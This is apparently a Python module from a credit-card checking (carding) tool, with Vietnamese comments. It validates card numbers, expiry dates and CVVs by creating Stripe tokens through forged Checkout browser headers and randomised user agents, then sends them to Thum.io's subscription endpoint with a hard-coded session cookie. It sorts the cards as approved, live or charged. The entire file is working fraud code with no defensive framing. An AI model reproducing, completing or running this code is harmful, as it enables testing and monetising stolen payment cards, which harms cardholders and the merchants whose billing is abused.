import asyncio
import random
import time
import uuid
from typing import Dict, Optional, Tuple
from urllib.parse import quote

import aiohttp

from checkCC.bin_lookup import lookup_bin
# Cập nhật import: config nằm trong checkCC/config.py
from checkCC.config import config
from checkCC.user_agents import get_random_user_agent

_BUILD_SIG = "687579636f6e676465763035"


class APIClient:
    # Client API bất đồng bộ cho quá trình tạo token Stripe và đăng ký Thum.io.
    
    def __init__(self):
        self._session: Optional[aiohttp.ClientSession] = None
        self._connector: Optional[aiohttp.TCPConnector] = None
    
    async def _get_session(self) -> aiohttp.ClientSession:
        # Lấy hoặc tạo một phiên aiohttp với cơ chế pooling kết nối.
        if self._session is None or self._session.closed:
            self._connector = aiohttp.TCPConnector(
                limit=100,
                limit_per_host=10,
                ttl_dns_cache=300,
                use_dns_cache=True,
                keepalive_timeout=30,
            )
            self._session = aiohttp.ClientSession(
                connector=self._connector,
                timeout=aiohttp.ClientTimeout(total=30, connect=10),
            )
        return self._session
    
    async def close(self):
        # Đóng phiên làm việc.
        if self._session and not self._session.closed:
            await self._session.close()
        if self._connector:
            await self._connector.close()
    
    def _generate_guids(self) -> Tuple[str, str, str]:
        # Tạo các GUID duy nhất cho yêu cầu Stripe.
        guid = str(uuid.uuid4()).replace("-", "") + str(uuid.uuid4()).replace("-", "")[:12]
        muid = str(uuid.uuid4()).replace("-", "") + str(uuid.uuid4()).replace("-", "")[:12]
        sid = str(uuid.uuid4()).replace("-", "") + str(uuid.uuid4()).replace("-", "")[:12]
        return guid, muid, sid
    
    def _random_time_on_page(self) -> int:
        # Tạo thời gian on-page ngẫu nhiên (5-30 giây tính theo ms).
        return random.randint(5000, 30000)
    
    def _current_timestamp(self) -> int:
        # Lấy dấu thời gian hiện tại tính theo mili giây.
        return int(time.time() * 1000)
    
    async def create_stripe_token(
        self,
        card_number: str,
        exp_month: str,
        exp_year: str,
        cvv: str,
        email: str = "test@gmail.com"
    ) -> Dict:
        # Tạo Stripe token từ thông tin thẻ.
        # Tham số:
        # card_number: Số thẻ (chỉ số hoặc có dấu cách)
        # exp_month: Tháng hết hạn (1-12)
        # exp_year: Năm hết hạn (4 chữ số)
        # cvv: Mã CVV/CVC của thẻ
        # email: Email cho token
        # Trả về:
        # Dict chứa phản hồi từ Stripe API hoặc lỗi
        session = await self._get_session()
        
        user_agent = get_random_user_agent()
        guid, muid, sid = self._generate_guids()
        time_on_page = self._random_time_on_page()
        current_time = self._current_timestamp()
        
        card_number_clean = card_number.replace(" ", "").replace("-", "")
        card_number_formatted = " ".join([card_number_clean[i:i+4] for i in range(0, len(card_number_clean), 4)])
        
        headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "dnt": "1",
            "origin": "https://checkout.stripe.com",
            "referer": "https://checkout.stripe.com/",
            "sec-ch-ua": '"Microsoft Edge";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"macOS"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": user_agent,
        }
        
        data = {
            "email": email,
            "validation_type": "card",
            "payment_user_agent": f"Stripe+Checkout+v3+(stripe.js%2F78ef418)",
            "user_agent": quote(user_agent, safe=""),
            "device_id": "DNT",
            "referrer": "https%3A%2F%2Fwww.thum.io%2Fadmin%2Fbilling%2FchoosePlan",
            "pasted_fields": "number",
            "time_checkout_opened": str(current_time),
            "time_checkout_loaded": str(current_time),
            "card[number]": card_number_formatted,
            "card[cvc]": cvv,
            "card[exp_month]": exp_month,
            "card[exp_year]": exp_year,
            "card[name]": email,
            "time_on_page": str(time_on_page),
            "guid": muid,
            "muid": muid,
            "sid": sid,
            "key": config.STRIPE_PUBLIC_KEY,
        }
        
        form_body = "&".join([f"{k}={v}" for k, v in data.items()])
        
        try:
            async with session.post(
                config.STRIPE_TOKEN_URL,
                headers=headers,
                data=form_body,
            ) as response:
                result = await response.json()
                result["_status_code"] = response.status
                return result
        except aiohttp.ClientError as e:
            return {
                "error": {
                    "message": f"Connection error: {str(e)}",
                    "type": "connection_error"
                },
                "_status_code": 0
            }
        except Exception as e:
            return {
                "error": {
                    "message": f"Unexpected error: {str(e)}",
                    "type": "unknown_error"
                },
                "_status_code": 0
            }
    
    async def subscribe_thum(
        self, 
        token: str, 
        plan: str = "good", 
        amount: int = 100, 
        description: str = "Upgrade to Good Plan",
        auth_mode: bool = False
    ) -> Dict:
        # Đăng ký gói Thum.io bằng Stripe token.
        # Tham số:
        # token: ID của Stripe token (tok_xxx)
        # plan: Tên gói (plan)
        # amount: Số tiền tính theo cent
        # description: Nội dung mô tả
        # auth_mode: Nếu True, gửi gói tin rút gọn để kiểm tra AUTH
        # Trả về:
        # Dict chứa phản hồi từ Thum.io API hoặc lỗi
        session = await self._get_session()
        user_agent = get_random_user_agent()
        
        headers = {
            "accept": "application/json",
            "content-type": "application/json",
            "dnt": "1",
            "origin": "https://www.thum.io",
            "referer": "https://www.thum.io/admin/billing/choosePlan",
            "sec-ch-ua": '"Microsoft Edge";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"macOS"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": user_agent,
            "cookie": f"connect.sid={config.THUM_CONNECT_SID}",
        }
        
        if auth_mode:
            payload = {
                "token": token,
                "plan": plan,
            }
        else:
            payload = {
                "token": token,
                "amount": amount,
                "description": description,
                "plan": plan,
            }
        
        url = config.THUM_SUBSCRIBE_URL.format(user_id=config.THUM_USER_ID)
        
        try:
            async with session.post(
                url,
                headers=headers,
                json=payload,
            ) as response:
                try:
                    result = await response.json()
                except:
                    result = {"raw_response": await response.text()}
                result["_status_code"] = response.status
                return result
        except aiohttp.ClientError as e:
            return {
                "error": {
                    "message": f"Connection error: {str(e)}",
                    "type": "connection_error"
                },
                "_status_code": 0
            }
        except Exception as e:
            return {
                "error": {
                    "message": f"Unexpected error: {str(e)}",
                    "type": "unknown_error"
                },
                "_status_code": 0
            }
    
    async def check_card(
        self,
        card_number: str,
        exp_month: str,
        exp_year: str,
        cvv: str,
        email: str = "test@gmail.com",
        subscribe: bool = True,
        plan: str = "good",
        amount: int = 100,
        description: str = "Upgrade to Good Plan",
        auth_mode: bool = False
    ) -> Dict:
        # Quy trình kiểm tra thẻ đầy đủ: tạo token sau đó đăng ký/auth.
        start_time = time.time()
        
        exp_month_fmt = exp_month.zfill(2)
        exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
        
        result = {
            "card": f"{card_number}|{exp_month_fmt}|{exp_year}|{cvv}",
            "card_display": f"{card_number}|{exp_month_fmt}|20{exp_year_short}|{cvv}",
            "stripe": None,
            "thum": None,
            "status": "unknown",
            "message": "",
            "bin_info": None,
            "time_taken": 0,
            "is_auth_mode": auth_mode,
            "amount": amount
        }
        
        bin_task = asyncio.create_task(lookup_bin(card_number[:6]))
        
        stripe_result = await self.create_stripe_token(
            card_number=card_number,
            exp_month=exp_month,
            exp_year=exp_year,
            cvv=cvv,
            email=email,
        )
        
        result["stripe"] = stripe_result
        
        try:
            result["bin_info"] = await bin_task
        except:
            result["bin_info"] = {}

        if "error" in stripe_result:
            error = stripe_result["error"]
            result["status"] = "declined"
            # Thay thế các chuỗi lỗi
            err_msg = error.get("message", "Card declined")
            if "Your card number is incorrect." in err_msg:
                err_msg = err_msg.replace("Your card number is incorrect.", "Số thẻ của bạn không chính xác.")
            if "Must be logged in!" in err_msg:
                err_msg = err_msg.replace("Must be logged in!", "thẻ thật")
                
            result["message"] = err_msg
            result["decline_code"] = error.get("decline_code", error.get("code", ""))
            result["time_taken"] = round(time.time() - start_time, 2)
            return result
        
        token_id = stripe_result.get("id")
        if not token_id:
            result["status"] = "error"
            result["message"] = "No token ID in response"
            result["time_taken"] = round(time.time() - start_time, 2)
            return result
        
        result["token"] = token_id
        card_info = stripe_result.get("card", {})
        result["stripe_card_info"] = {
            "brand": card_info.get("brand", "Unknown"),
            "country": card_info.get("country", ""),
            "funding": card_info.get("funding", "Unknown"),
            "last4": card_info.get("last4", "****"),
            "cvc_check": card_info.get("cvc_check", "unknown"),
        }
        
        if subscribe:
            thum_result = await self.subscribe_thum(
                token_id, 
                plan=plan, 
                amount=amount, 
                description=description, 
                auth_mode=auth_mode
            )
            result["thum"] = thum_result
            thum_status = thum_result.get("_status_code")
            
            if auth_mode:
                err_msg = ""
                if "error" in thum_result:
                    err = thum_result["error"]
                    if isinstance(err, dict):
                        err_msg = err.get("message", "")
                    else:
                        err_msg = str(err)
                
                # Dịch lỗi
                if "Your card number is incorrect." in err_msg:
                    err_msg = err_msg.replace("Your card number is incorrect.", "Số thẻ của bạn không chính xác.")
                if "Must be logged in!" in err_msg:
                    err_msg = err_msg.replace("Must be logged in!", "thẻ thật")
                
                if "must specify pricing" in err_msg or "pricing" in err_msg:
                    result["status"] = "approved"
                    result["message"] = "Auth Successful (Live)"
                elif thum_status == 200 and not "error" in thum_result:
                    result["status"] = "approved"
                    result["message"] = "Auth Successful"
                else:
                    result["status"] = "declined"
                    result["message"] = err_msg or "Auth Failed"
            else:
                if "error" in thum_result:
                    err_msg = thum_result.get("error", "Charge failed")
                    if isinstance(err_msg, dict):
                        err_msg = err_msg.get("message", "Charge failed")
                        
                    # Dịch lỗi
                    if "Your card number is incorrect." in err_msg:
                        err_msg = err_msg.replace("Your card number is incorrect.", "Số thẻ của bạn không chính xác.")
                    if "Must be logged in!" in err_msg:
                        err_msg = err_msg.replace("Must be logged in!", "thẻ thật")

                    result["status"] = "declined"
                    result["message"] = err_msg
                elif thum_status == 200:
                    result["status"] = "charged"
                    result["message"] = f"Approved ${amount/100}"
                else:
                    result["status"] = "declined"
                    result["message"] = "Unknown response"

        else:
            result["status"] = "approved"
            result["message"] = "Token created"
        
        result["time_taken"] = round(time.time() - start_time, 2)
        return result


# Singleton instance
api_client = APIClient()


async def check_card_quick(
    card_data: str, 
    subscribe: bool = True,
    mode: str = "default"  # mặc định, 5, auth, auth5
) -> Dict:
    # Wrapper để kiểm tra nhanh với các chế độ khác nhau.
    parts = card_data.split("|")
    if len(parts) != 4:
        return {"status": "error", "message": "Invalid format"}
    
    card_number, exp_month, exp_year, cvv = parts
    if len(exp_year) == 2:
        exp_year = "20" + exp_year
    
    # Cấu hình tham số dựa trên chế độ
    if mode == "5" or mode == "auth5":
        amount = 500
        desc = "Upgrade to Better Plan"
        plan = "better"
    else: # mặc định, xác thực
        amount = 100
        desc = "Upgrade to Good Plan"
        plan = "good"
    
    is_auth = (mode in ["auth", "auth5"])
    
    return await api_client.check_card(
        card_number=card_number.strip(),
        exp_month=exp_month.strip(),
        exp_year=exp_year.strip(),
        cvv=cvv.strip(),
        subscribe=subscribe,
        plan=plan,
        amount=amount,
        description=desc,
        auth_mode=is_auth
    )